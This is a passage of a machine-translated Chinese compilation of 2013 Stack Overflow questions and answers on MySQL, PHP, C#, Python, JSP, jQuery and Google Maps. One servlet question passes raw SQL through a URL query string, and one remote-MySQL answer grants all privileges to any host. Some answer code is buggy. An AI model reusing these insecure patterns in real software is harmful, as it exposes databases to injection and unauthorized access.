将“硬”/“软”处理程序转换为线程处理程序的最初工作是由 Thomas Gleixner 和团队在构建[PREEMPT_RT Linux](https://rt.wiki.kernel.org/index.php/Main_Page)（又名 Linux-as-an-RTOS）项目时完成的（它不是主线的一部分）。要真正让 Linux 作为 RTOS 运行，我们不能容忍中断处理程序中断最关键的 rt (app) 线程的情况；但是我们如何确保应用程序线程甚至覆盖中断？通过使其（中断）线程化、可调度（SCHED_FIFO）并具有低于应用程序线程的优先级（中断线程 rtprio 默认为 50）。因此，rtprio 为 60 的“rt”SCHED_FIFO 应用程序线程即使是中断线程也能够“抢占”（足够接近它可以工作）。那应该回答你的问题。2.

Wrt to Qs 3：正如其他人所说，您的代码必须处理这种情况。话虽如此，请注意使用线程处理程序的关键点是，您可以执行（可能）阻塞（睡眠）的工作。如果您的“下半部分”工作保证是非阻塞的并且*必须*快速，请使用传统风格的“上半部分/bh”处理程序。我们怎么能做到这一点？简单：不要使用 request_threaded_irq() 只需调用 request_irq() - 代码中的注释清楚地说明（wrt 3rd parameter）：

```
* @thread_fn: Function called from the irq handler thread
*          If NULL, no irq thread is created" 
```

或者，您可以将 IRQF_NO_THREAD 标志传递给 request_irq。

（顺便说一句，在 3.14.23 内核源代码树上使用 cscope 进行的快速检查显示 request_irq() 被调用了 1502 次[给我们*非线程*中断处理]，并且 request_threaded_irq() [*线程*中断] 被显式调用了 204 次）。

# mysql - 使用 LEFT JOIN 在查询中请求随机行

> ID：15526864
> 
> 赞同：0
> 
> 时间：2013-03-20T14:48:50.970
> 
> 标签：mysql

我有 2 个测验表：“问题”和“答案”。每个问题都有 4 个答案。我想要求 50 个随机问题。我试试这个，但它返回的问题少于 50 个。

（我需要所有 50 个问题和 200 个答案的所有字段）。

```
SELECT Q.*, A.* FROM questions Q
LEFT JOIN answers A ON Q.pid = A.pid
WHERE Q.pid >= RAND() * (SELECT MAX(pid) FROM questions)
AND  Q.lid IN $array
GROUP BY Q.pid
LIMIT 50 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:58:20.897

尝试以下操作：

```
 SELECT y.* 
   FROM 
      ( SELECT * 
          FROM questions 
         ORDER 
            BY RAND() LIMIT 2
      ) x 
   JOIN answers y 
     ON y.question_id = x.question_id 
  ORDER  
     BY x.question_id; 
```

# android - Android：在主页点击时，模拟器会保留应用程序状态，而真正的手机不会？

> ID：15526873
> 
> 赞同：0
> 
> 时间：2013-03-20T14:49:07.977
> 
> 标签：android

看来，当我在模拟器上单击“主页”并返回应用程序时，状态会被保留。

但我的实体手机（T-Mobile Move，2.2）似乎并非如此。

为什么？如何让Android在手机上点击“主页”后保留应用状态，以便用户返回时，一切都保持不变？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:18:16.580

模拟器有多少内存？如果活动太大，操作系统可能会在手机进入后台时将其杀死，因为手机内存不足。模拟器可能有更多内存，因此不会杀死应用程序来回收它。

# apache-flex - Flex Slider，同步时跳过第二个缩略图

> ID：15526876
> 
> 赞同：1
> 
> 时间：2013-03-20T14:49:11.720
> 
> 标签：apache-flex, thumbnails, carousel, flexslider

我正在使用 2 个同步的 FlexSlider2，因此其中一个用作主滑块的缩略图轮播导航。我在主幻灯片上将幻灯片设置为 true，在同步为导航的滑块上设置为 false。一切都很顺利，除了 FlexSldier2 没有向缩略图中的第二张幻灯片添加活动类，它只是跳过它。然而，大的主图像过渡很好。我搜索了所有 voer，这是唯一相关的，但是那里也没有答案：[https](https://github.com/woothemes/FlexSlider/issues/331) ://github.com/woothemes/FlexSlider/issues/331 。

下面是我的代码，JS 和 HTML。请让我知道是否有其他人经历过这种情况，因为我不知所措。

```
<script>
$(window).load(function() {
  // The slider being synced must be initialized first
  $('#thumbslide').flexslider({
    animation: "slide",
    controlNav: false,
    directionNav: true,
    animationLoop: true,
    slideshow: false,
    itemWidth: 250,
    itemMargin: 15,
    asNavFor: '#mainslide',

  });

  $('#mainslide').flexslider({
    animation: "fade",
    controlNav: false,
    directionNav: true,
    animationLoop: true,
    slideshow: true,
    initDelay: 50,
    slideshowSpeed: 6000,           //Integer: Set the speed of the slideshow cycling, in milliseconds
    animationSpeed: 600, 
    sync: "#thumbslide"
  });
}); 
```

```
 <div class="slidewrap">
<div id="mainslide"  class="flexslider">
    <ul class="slides">
        <li> <a href="/The-Primo-Story"> <img src="/images/slide1.png" /> </a> </li>
        <li> <a href="/rewards-cards"> <img src="/images/slide2.png" /> </a> </li>
        <li> <a href="/trays"> <img src="/images/slide3.png" /> </a> </li>
        <li> <a href="/Franchise"> <img src="/images/slide4.png" /> </a> </li>
        <li> <a href="#form_3"> <img src="/images/slide5.png" /> </a> </li>
        <li> <a href="/Locations-New"> <img src="/images/slide6.png" /> </a> </li>
    </ul>
</div>
<div id="thumbslide" class="flexslider">
    <ul class="slides">
        <li> <img src="/images/thumb1.jpg" /> <img src="/images/red.png" class="redpic" /> </li>
        <li> <img src="/images/thumb2.jpg" /> <img src="/images/red.png" class="redpic" /> </li>
        <li> <img src="/images/thumb3.jpg" /> <img src="/images/red.png" class="redpic" /> </li>
        <li> <img src="/images/thumb4.jpg" /> <img src="/images/red.png" class="redpic" /> </li>
        <li> <img src="/images/thumb5.jpg" /> <img src="/images/red.png" class="redpic" /> </li>
        <li class="last"> <img src="/images/thumb6.jpg" /> <img src="/images/red.png" class="redpic" /> </li>
    </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-30T07:49:49.273

我认为这是因为 itemWidth 和 itemMargin。如果将“itemWidth: 250”替换为“itemWidth: 265”（265 = 250 + 15（即 itemMargin）），则问题应该得到解决。它对我有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-03T13:36:41.737

这是 Flexslider 本身的问题。

在“canAdvance”函数[Flexslider 2.2.0版的第797行]中，只需更改`slider.pageCount`为`slider.count`

# php - php 类方法在没有类引用的情况下静态使用？

> ID：15526879
> 
> 赞同：0
> 
> 时间：2013-03-20T14:49:14.113
> 
> 标签：php, class, static

我有这样的课：

```
class Utils{

   public function hello()
   {
      return "<b>Hello World</b></br>";
   }

} 
```

我现在可以在我的`page.php`：

require_once("classes/Utils.php");

`echo hello();`

或者我必须这样做：

```
$u = new Utils;
$u->hello(); 
```

即使该函数不包含需要实例化的对象属性？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:52:54.967

是的，如果您将函数声明为静态。

```
class Utils{

   public static function hello()
   {
      return "<b>Hello World</b></br>";
   }

} 
```

并将其称为

```
Utils::hello() 
```

[php静态函数](https://stackoverflow.com/questions/902909/php-static-function)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:51:11.767

实际上你调用这样的静态方法：

```
Utils::hello(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:52:09.477

您可以像这样直接调用它：

```
echo Utils::hello(); 
```

这是一个[PHPFiddle 示例](http://phpfiddle.org/lite/code/n1v-bx3)

# c# - 在 dos 中运行 C# 控制台应用程序？

> ID：15526880
> 
> 赞同：0
> 
> 时间：2013-03-20T14:49:14.203
> 
> 标签：c#, dos

我最近买了一台旧的 dos/windows 3.1 笔记本电脑。我想知道是否可以在其中运行我用 c# 制作的控制台应用程序。

我知道这可能是一个非常愚蠢的问题，但我真的想知道这是否可能。

如果不是，那么对于具有非常基本的 c# 知识的人来说，为 dos 或 windows 3.1 编写一些小程序的最佳选择是什么？

提前致谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-20T14:53:46.527

> 我最近买了一台旧的 dos/windows 3.1 笔记本电脑。我想知道是否可以在其中运行我用 c# 制作的控制台应用程序。

不。

Windows 3.1 于 1992 年发布，是一个 16 位操作系统。十年后的 2002 年，C# 1.0 发布，需要 32 位操作系统。

> 如果不是，那么对于具有非常基本的 c# 知识的人来说，为 dos 或 windows 3.1 编写一些小程序的最佳选择是什么？

改为学习基础。有几个版本的 Basic 可用于 Windows 3.1。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T14:50:54.607

不，DOS 不支持 .NET 框架，或者我应该说 .NET 框架不支持 DOS...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T14:54:50.560

甚至[.net 1.1 也仅支持至 windows 98](http://msdn.microsoft.com/en-us/library/8z6watww%28v=vs.71%29.aspx)：

您最好的选择可能是重新格式化您的旧笔记本电脑，安装[轻量级 linux 发行版并在](http://en.wikipedia.org/wiki/Lightweight_Linux_distribution)[mono](http://www.mono-project.com/Main_Page)上尝试您的程序。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T14:51:21.300

不，您需要能够为 C# 运行 .NET 运行时，这可能不会让您早于 Windows XP。.NET 不支持 DOS/Windows 3.1。您可以使用较旧的 VB，但它不会是 .NET。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-20T14:54:45.593

这个问题之前在 Stack Overflow 上被问过： [在 DOS 上使用 Mono](https://stackoverflow.com/questions/8670325/using-mono-on-dos)

由于 C# 是一种开放标准，因此除了 Microsoft 之外，还有其他 C# 实现。一种流行的是单声道。

您可能需要考虑在您的笔记本电脑上加载 Linux。在 Linux 下你会得到比在 DOS/Win31 下更多的功能。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-20T14:55:16.940

所以其他人已经回答说 .NET 不适用于您当前的配置，作为替代方案，我建议您最好安装一些 Linux 变体并使用 Mono ...

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-20T14:50:50.783

如果你想做 c#，你需要 .NET 框架。据我所知，这样的旧系统没有.net框架......

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-20T14:51:43.957

.NET 不能在 DOS 上运行。有一个名为 FreeDOS 的开源项目，但它似乎不运行 .NET 程序。从[FreeDOS 的页面](http://www.freedos.org/)：

> FreeDOS 是一个完整的、免费的、与 DOS 兼容的操作系统。虽然我们提供了我们自己的程序和实用程序，但您应该能够运行任何用于 MS-DOS 的程序。你甚至可以做网络！但是，您可能会遇到在 FreeDOS 上运行 Windows 的问题。例如，Windows 标准模式适用于 FreeDOS，但 386 模式 Windows for Workgroups 3.11 则不能。

# mysql - 如何从远程机器访问我的专用服务器上的 MySql

> ID：15526882
> 
> 赞同：0
> 
> 时间：2013-03-20T14:49:22.647
> 
> 标签：mysql, remote-access, dedicated-server, dedicated-hosting

我在 IP 地址为 12.12.123.123 的专用服务器上设置了 MySql 服务器。我已将 MySql 配置为允许远程访问。现在我想从远程应用程序访问服务器。我怎样才能做到这一点？如何获取 MySql 的主机/服务器名称以放入我的连接字符串？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:57:40.307

您可以将服务器的 IP 地址作为主机名。

确保

*   mysql 服务器正在监听公共 IP，所以在`my.cnf`：

    ```
    bind-address = 0.0.0.0 
    ```

*   您在 mysql 服务器上配置的用户被允许远程访问模式：

    ```
    GRANT ALL PRIVILEGES TO `user`@% ... 
    ```

    为了更安全，您不必使用通配符，您可以使用特定的主机或 IP 模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:59:31.287

假设您的服务器是完全可访问的并且服务器实例已充分配置，您可以使用 mysql 的`-h`开关测试连接，如下所示：

```
mysql -u username -p -h 44.55.66.77 
```

成功建立此连接后，您可以在应用程序中使用相同的详细信息。

# python - 将字符串（不带任何分隔符）转换为列表

> ID：15526883
> 
> 赞同：19
> 
> 时间：2013-03-20T14:49:26.543
> 
> 标签：python, string, list

我有一个电话号码（字符串），例如“+123-456-7890”，我想将其转换为如下所示的列表：[+, 1, 2, 3, -, ...., 0]。

为什么？所以我可以遍历列表并删除所有符号，所以我只剩下一个数字列表，然后我可以将其转换回字符串。

解决这个问题的最佳方法是什么？我遇到的所有解决方案都不适用，因为我在数字之间没有任何特殊字符（所以我不能在那里拆分字符串。）

有任何想法吗？对此，我真的非常感激！

编辑 - 这是我尝试过的：

```
x = row.translate(None, string.digits)
list = x.split() 
```

还：

```
filter(lambda x: x isdigit()) 
```

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2013-03-20T14:50:36.290

制作一个**列表（your_string）**。

```
>>> s = "mep"
>>> list(s)
['m', 'e', 'p'] 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-20T14:50:53.490

你的意思是你想要这样的东西：

```
''.join(n for n in phone_str if n.isdigit()) 
```

这利用了字符串是可迭代的事实。当您迭代它们时，它们一次产生 1 个字符。

* * *

关于你的努力，

这实际上从字符串*中删除*了所有数字，只留下非数字。

```
x = row.translate(None, string.digits) 
```

这一个在空格运行时拆分字符串，而不是在每个字符之后：

```
list = x.split() 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-20T14:53:00.613

```
''.join(filter(str.isdigit, "+123-456-7890")) 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-03-20T14:52:08.480

您可以使用 re 模块：

```
import re
re.sub(r'\D', '', '+123-456-7890') 
```

这将用''替换所有非数字。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-03-20T15:27:53.240

我知道这个问题已经得到解答，但只是`timeit`指出关于解决方案效率的内容。使用这些参数：

```
size = 30
s = [str(random.randint(0, 9)) for i in range(size)] + (size/3) * ['-']
random.shuffle(s)
s = ''.join(['+'] + s)
timec = 1000 
```

即“电话号码”有 30 位数字，1 加 sing 和 10 '-'。我已经测试了这些方法：

```
def justdigits(s):
    justdigitsres = ""
    for char in s:
        if char.isdigit():
            justdigitsres += str(char)
    return justdigitsres

re_compiled = re.compile(r'\D')

print('Filter: %ss' % timeit.Timer(lambda : ''.join(filter(str.isdigit, s))).timeit(timec))
print('GE: %ss' % timeit.Timer(lambda : ''.join(n for n in s if n.isdigit())).timeit(timec))
print('LC: %ss' % timeit.Timer(lambda : ''.join([n for n in s if n.isdigit()])).timeit(timec))
print('For loop: %ss' % timeit.Timer(lambda : justdigits(s)).timeit(timec))
print('RE: %ss' % timeit.Timer(lambda : re.sub(r'\D', '', s)).timeit(timec))
print('REC: %ss' % timeit.Timer(lambda : re_compiled.sub('', s)).timeit(timec))
print('Translate: %ss' % timeit.Timer(lambda : s.translate(None, '+-')).timeit(timec)) 
```

并得出了以下结果：

```
Filter: 0.0145790576935s
GE: 0.0185861587524s
LC: 0.0151798725128s
For loop: 0.0242128372192s
RE: 0.0120108127594s
REC: 0.00868797302246s
Translate: 0.00118899345398s 
```

显然 GE 和 LC 仍然比正则表达式或编译的正则表达式慢。显然我的 CPython 2.6.6 并没有优化字符串添加。`translate`似乎是最快的（这是预期的，因为问题被表述为“忽略这两个符号”，而不是“获取这些数字”，我相信这是相当低级的）。

对于`size = 100`：

```
Filter: 0.0357120037079s
GE: 0.0465779304504s
LC: 0.0428011417389s
For loop: 0.0733139514923s
RE: 0.0213229656219s
REC: 0.0103371143341s
Translate: 0.000978946685791s 
```

对于`size = 1000`：

```
Filter: 0.212141036987s
GE: 0.198996067047s
LC: 0.196880102158s
For loop: 0.365696907043s
RE: 0.0880808830261s
REC: 0.086804151535s
Translate: 0.00587010383606s 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-20T14:53:17.650

您可以迭代第一个字符串并通过将找到的每个数字字符添加到该新字符串来创建第二个字符串，而不是转换为列表。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-03-20T14:50:51.460

python字符串*是*一个字符列表。您现在可以对其进行迭代！

```
justdigits = ""
for char in string:
    if char.isdigit():
        justdigits += str(char) 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2015-08-06T19:48:03.593

你试过list（x）吗？

```
 y = '+123-456-7890'
 c =list(y)
 c 
```

['+', '1', '2', '3', '-', '4', '5', '6', '-', '7', '8', '9', ' 0']

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-03-20T15:15:54.493

你*可以*使用`str.translate`，你只需要给它正确的参数：

```
>>> dels=''.join(chr(x) for x in range(256) if not chr(x).isdigit())
>>> '+1-617-555-1212'.translate(None, dels)
'16175551212' 
```

注意：这不适用于 Python2 中的 unicode 字符串，或者根本不适用于 Python3。对于这些环境，您可以创建一个自定义类以传递给`unicode.translate`：

```
>>> class C:
...    def __getitem__(self, i):
...       if unichr(i).isdigit():
...          return i
... 
>>> u'+1-617.555/1212'.translate(C())
u'16175551212' 
```

这也适用于非 ASCII 数字：

```
>>> print u'+\u00b9-\uff1617.555/1212'.translate(C()).encode('utf-8')
¹６175551212 
```

# jsp - Servlet/JSP：在移动类型上找不到属性“id”

> ID：15526887
> 
> 赞同：0
> 
> 时间：2013-03-20T14:49:42.130
> 
> 标签：jsp, servlets, jstl

1）我在一个模拟 HTTP`GET`请求的 HTML 页面中有一个链接。（通过手动提供查询字符串。这个页面基本上调用一个 Servlet，在其`doGet()`方法中完成数据库访问。SQL 查询作为查询的一部分发送细绳。

`http://localhost:8080/prelim_db_test_19_3_2013/md?q=select * from test.mobile` （`test`是 MySQL 数据库，`mobile`是表）。

2) 然后，将结果存储在一个 ArrayList 中。

```
ArrayList <mobile> mylist=new ArrayList<mobile> ();
mylist.add(new mobile(rs.getInt("id"),rs.getString("name"))); 
```

where`mobile`只是一个带有`id`和`name`作为类变量的类（以及一个构造函数）

3)`ArrayList`然后将其转发到另一个 JSP：

```
request.setAttribute("answer", mylist);
request.getRequestDispatcher("info.jsp").forward(request, response); 
```

4) 现在在第二个 JSP 中，我简单地使用`<c:forEach>`来迭代和打印表格内容：

```
<c:forEach items="${answer}" var="i">
    <tr>
        <td>${i.id}</td>
        <td>${i.name}</td>
    </tr>
</c:forEach> 
```

但是，当我运行该项目时，会引发异常：

`javax.el.PropertyNotFoundException: Property 'id' not found on type mobile`

在这一行：

`request.getRequestDispatcher("info.jsp").forward(request, response);`

请注意，当结果打印到控制台时，数据库访问本身可以正常工作（因此 Servlet 也被我的查询字符串调用）。这是我在 Eclipse 中的项目设置（如果设置方式有任何问题）：

![在此处输入图像描述](../Images/f4ce03a945fcefdbec6d3c5ce24d1947.png)

我在这里做错了什么？

**编辑** `mobile.java`：

```
public class mobile {
 int id;
 String name;
public mobile(int i,String n) {
    id=i;
    name=n;
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:59:33.133

在移动类中，您需要为字段放置setter和getter。然后只有您可以在jsp中访问。我认为您没有为它们保留setter和getter。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:51:17.680

正如@PSR 和@CaptainGouLash 正确指出的那样，getter 和setter 需要设置，以便可以通过JSTL 访问类变量。

请参阅： [除此之外](http://www.ibm.com/developerworks/java/library/j-jstl0211/index.html)，[正如@CaptainGouLash 指出的那样](http://docs.oracle.com/javaee/6/tutorial/doc/gjbbp.html)

# ruby - 使用指南针和 zurb-foundation 的问题

> ID：15526888
> 
> 赞同：2
> 
> 时间：2013-03-20T14:49:48.030
> 
> 标签：ruby, rubygems, sass, zurb-foundation, compass-sass

嗨，我有 zurb 基金会，我完全是新手。我使用的是 ubuntu 12.04 ppc (g5) 机器，我从终端进行了安装，一切正常，但是当我尝试使用 compass 和 Zurb-foundation 创建项目时，这是怎么回事？

LoadError on line 122 of /usr/lib/ruby/vendor_ruby/sass/../compass/configuration/data.rb: no such file to load -- zurb-foundation 使用 --trace 运行以查看完整的回溯

我做了 sudo gedit 来查看这个文件 data.rb 是否存在并且肯定它确实存在......所以因为我是一个不精通 ruby​​ 或指南针的设计师......这是怎么回事，羞愧地剃光头......任何帮助将不胜感激。

顺便说一句，我用谷歌搜索过，什么也没有。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-23T19:48:36.547

您忘记安装 Zurb Foundation。:)

请执行以下命令：

```
gem install zurb-foundation 
```

这将为 Compass 安装 Zurb Foundation 扩展。

之后，您可以创建由 Foundation 提供支持的 Compass 项目。

不要忘记研究文档： http: [//foundation.zurb.com/docs/sass.html](http://foundation.zurb.com/docs/sass.html)

# php - 如何在不使用任何 cms 的两个不同站点 php 中使用 dame 数据库？

> ID：15526893
> 
> 赞同：0
> 
> 时间：2013-03-20T14:49:52.943
> 
> 标签：php, mysql, database

我想使用单个数据库运行两个站点一个 cpanel-phpmyadmin 我如何访问另一个站点以访问在一个站点上上传的同一个数据库。

对于第一个站点，我使用代码连接到数据库

```
mysql_connect("localhost","User","password");
mysql_select_db("database"); 
```

什么将是 php 中的数据库连接代码，以便我可以评估一个数据库到多个站点...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-10T16:15:26.710

首先，您应该检查您的 MySQL 设置以确保它允许远程连接。如果允许远程连接，您可以从远程服务器以类似的方式连接，通过指定当前服务器的 IP 地址而不是运行数据库的“localhost”，即如果数据库在 IP 地址为 123.123.123.123 的服务器上运行，则代码将如下所示：

> mysql_connect("123.123.123.123","用户","密码");
> 
> mysql_select_db("数据库");

你可以试试这个

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:51:47.810

首先，您应该检查您的 MySQL 设置以确保它允许远程连接。如果允许远程连接，您可以从远程服务器以类似的方式连接，方法是指定当前服务器的 IP 地址，而不是运行数据库的“localhost”，即如果数据库在 IP 地址为 123.123.123.123 的服务器上运行，则代码将如下所示：

```
mysql_connect("123.123.123.123","User","password");
mysql_select_db("database"); 
```

# jquery - jQuery 的 :nth-child 和 :first-child 选择了错误的元素

> ID：15526898
> 
> 赞同：0
> 
> 时间：2013-03-20T14:50:04.897
> 
> 标签：jquery, css, soundmanager2

我正在使用 Soundmanager2 和 RoyalCarousel 的组合来获得播放列表风格的轮播。我现在的目标是使其使其在选择特定幻灯片时，通过使用背/前向按钮或“跳过”链接，即适当的歌曲。这适用于除第一张幻灯片之外的所有幻灯片，它始终触发最后一张幻灯片开始播放。触发最后一张幻灯片也会触发最后一张幻灯片，所以这两个不是颠倒的。看到这个在行动。 [http://ably.ca/hootch](http://ably.ca/hootch)

```
$(".rsNavItem").live('click', function(){
  var id = $(this).index() + 1;
  $(".rsContainer div:nth-child("+ id +") .ui360 .sm2-360btn").click();
}); 
```

我在这里检查并重新检查了所有内容， :nth-child(1) 每次都选择 :nth-child(9) 。即使测试 id == 1 并使用 first-child 也不起作用......有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:34:08.373

试试这个

```
var rsContainer = $('.rsContainer');
$('.rsNavItem').live('click', function(){
    var index = $(this).index();

    $('.rsSlide:eq(' + index + ') .ui360 .sm2-360btn', rsContainer).click();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:15:04.343

我找到了解决方案，但我不喜欢它...

```
$(".rsNavItem").live('click', function(){
  var id = $(this).index();
  soundManager.stopAll();
  $(".rsContainer").children().each(function(){
      if ($(this).index() == id) {
          $(this).find(".ui360 .sm2-360btn").click();
          return false;
      }
  });
}); 
```

而不是使用 :nth-child，我决定尝试遍历所有子元素并检查'skip-to'链接的索引与幻灯片的索引，然后使用 find() 像以前一样点击按钮......我不喜欢它，因为它是一个循环......与 :nth-child 相比，它似乎更像是一个性能打击......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T21:35:20.350

当您定位时

```
$(".rsContainer div:nth-child(1) ... 
```

你得到不少于 37 个结果！

这就是他们父母的第一个孩子的所有 div，无论他们嵌套多深。

我想你的意思是

```
$(".rsContainer > div:nth-child(1) ... 
```

（直接后代，不是任何级别的后代）

# google-maps - 在一个或多个航路点上围绕设定时间进行路由

> ID：15526899
> 
> 赞同：0
> 
> 时间：2013-03-20T14:50:07.817
> 
> 标签：google-maps, routing, bing-maps, traveling-salesman

这是使用 Bing Maps API 或 Google Maps API。

问题：我正在尝试为当天可能有 1 次或更多次会议的销售人员创建一条路线，并从池中进行访问选择。这意味着销售人员在客户那里召开了 1 次会议，他们希望在会议时间前后停留一些潜在客户。

我怀疑任何一项服务都可以直接处理这个问题。他们是否可以从这些服务中获取“目的地之间的时间表”，而无需运行我的请求。

我知道的唯一方法是提交路线上的每个变化，存储在表格或数组中，然后根据服务“到达那里的时间”，计算最佳顺序。然后重新提交。我的客户每次尝试可以轻松烧掉 20 到 30 个请求。

还有其他选择吗？也许是一个带有 sh*ty 算法的免费开源软件，然后将最终列表提交给上述之一？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:16:32.620

您可以使用距离矩阵服务，请参阅此处的文档： [https ://developers.google.com/maps/documentation/distancematrix/](https://developers.google.com/maps/documentation/distancematrix/)

通过这种方式，您将能够计算多个点之间的多条路线，并且肯定会减少整体请求的数量。

如果您的请求只是为销售人员进行优化，您还可以检查路由服务的选项及其`optimize`选项，请参阅：[https ://developers.google.com/maps/documentation/directions/#Waypoints](https://developers.google.com/maps/documentation/directions/#Waypoints)

在 Bing 上，路线优化（航点重新排序）尚不可用，但您可以使用 Route Matrix API 实现此目的。

# javascript - google.maps.event.addListener 和 fall 调用

> ID：15526900
> 
> 赞同：0
> 
> 时间：2013-03-20T14:50:07.653
> 
> 标签：javascript, jquery, google-maps-api-3, event-handling

我创建了这个标记，我想将标记附加和处理程序，并将一个附加到单击标记时显示的信息窗口内的对象：

```
var marker = new google.maps.Marker({
    position: posizione,
    map: map,
    title: "Title"
});

markerClick = function () {
    templateFinestra.find('.titolo').html("New Title");
    var prova = templateFinestra.find('.myLink');
    google.maps.event.addDomListener(prova, 'click', alert("Hello"));

    infoWindow.setContent(templateFinestra.html());
    infoWindow.open(map, marker);       
};

google.maps.event.addListener(marker, 'click', markerClick); 
```

但是当我点击标记时，我看到了警报！为什么？以及如何创建 2 个单独的处理程序？（一个用于标记，一个用于单击标记时打开的信息窗口链接）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:52:17.780

因为您正在立即执行它并将其作为函数返回（它不是）。

```
google.maps.event.addDomListener(prova, 'click', function(){
    alert("Hello")
}); 
```

# c# - 当 ienumerable 为空时，foreach 循环中的“Else”等效项

> ID：15526902
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:50:09.807
> 
> 标签：c#, collections, foreach, ienumerable

假设 ienumerable 不为空，如果该 ienumerable 为空，则 foreach 循环将不会执行。但是，如果集合为空，我需要运行其他代码。这是完美运行的示例代码：

```
List<string> theList = new List<string>() {};

if (theList.Count > 0) {
    foreach (var item in theList) {
       //do stuff
    }
} else {
    //throw exception or do whatever else
} 
```

有没有办法通过开箱即用的 C#、扩展方法等来缩短它？在我的脑海中，我认为以下内容会很酷，但显然它不起作用：

```
List<string> theList = new List<string>() {};

foreach (var item in theList) {
   //do stuff
} else {
    //throw exception or do whatever else
} 
```

编辑：感谢 Maarten 的见解，我的解决方案：如果集合为空或为空，以下将引发异常（如果您想简单地**忽略**集合为空或空的情况，请在 foreach 中使用三元运算符）

```
static class Extension {
    public static IEnumerable<T> FailIfNullOrEmpty<T>(this IEnumerable<T> collection) {
        if (collection == null || !collection.Any())
            throw new Exception("Collection is null or empty");

        return collection;
    }
}

class Program {
    List<string> theList = new List<string>() { "a" };

    foreach (var item in theList.FailIfNullOrEmpty()) {
        //do stuff                    
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:55:24.007

如果你真的想实现这一点，你可以创建一个扩展方法（就像你自己说的那样）。

```
class Program {
    static void Main(string[] args) {
        List<string> data = new List<string>();
        foreach (var item in data.FailIfEmpty(new Exception("List is empty"))) {
            // do stuff
        }
    }
}
public static class Extensions {
    public static IEnumerable<T> FailIfEmpty<T>(this IEnumerable<T> collection, Exception exception) {
        if (!collection.Any()) {
            throw exception;
        }
        return collection;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:55:55.753

您可以预先抛出异常，而无需编写`else`块：

```
if(mylist.Count == 0)
    throw new Exception("Test");

foreach(var currItem in mylist)
    currItem.DoStuff(); 
```

如果引发异常，执行流程将不会到达循环。

# windows-phone-7 - WP：如何使用 ToList() 方法在 linq to sql 中选择多列语句？

> ID：15526905
> 
> 赞同：0
> 
> 时间：2013-03-20T14:50:13.703
> 
> 标签：windows-phone-7

我使用 select 语句 LINQ to SQL 从表中选择了 4 列。然后我创建一个新列表来存储查询结果。但是，代码**room.ToList();** 是错的。

1.  为什么我们不能使用“rooms_list = room.ToList()”？

2.  我们应该怎么做才能解决问题？？？

谢谢你教我！

```
private void btnTest_Click(object sender, EventArgs e)
        {
            List<string> rooms_list = new List<string>();

            using (LVDatabaseEntities database = new LVDatabaseEntities())
            {
                var room = from x in database.PHONGCHOIs
                            select new { x.TENPHONG, x.MATKHAUPHONG, x.CHUPHONG, x.SOLUONG };
                rooms_list = room.ToList();
            }
            MessageBox.Show(rooms_list.Count.ToString());
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T18:00:15.627

您的 rooms_list = room.ToList() 是错误的，因为它不是字符串类型的列表。

要解决这个问题，首先为房间创建一个类

```
class Room
{
  string TENPHONG { get; set; }
  string MATKHAUPHONG { get; set; }
  string CHUPHONG{ get; set; }
  string SOLUONG{ get; set; }
} 
```

然后，像这样更改您的代码

```
List<Room> rooms_list = new List<Room>();

using (LVDatabaseEntities database = new LVDatabaseEntities())
{
   var rooms = from x in database.PHONGCHOIs
                    select new Room{ 
    TENPHONG = x.TENPHONG,
    MATKHAUPHONG = x.MATKHAUPHONG,
    CHUPHONG = x.CHUPHONG,
    SOLUONG  = x.SOLUONG };
   rooms_list = room.ToList();
}
MessageBox.Show(rooms_list.Count.ToString()); 
```

*未经测试。让我知道是否有任何问题

# php - 使用 jquery $.ajax 发送鼠标位置

> ID：15526906
> 
> 赞同：1
> 
> 时间：2013-03-20T14:50:17.410
> 
> 标签：php, jquery, ajax

我正在尝试使用 jquery $.ajax 方法将鼠标位置发送到服务器，但我无法使其正确。

```
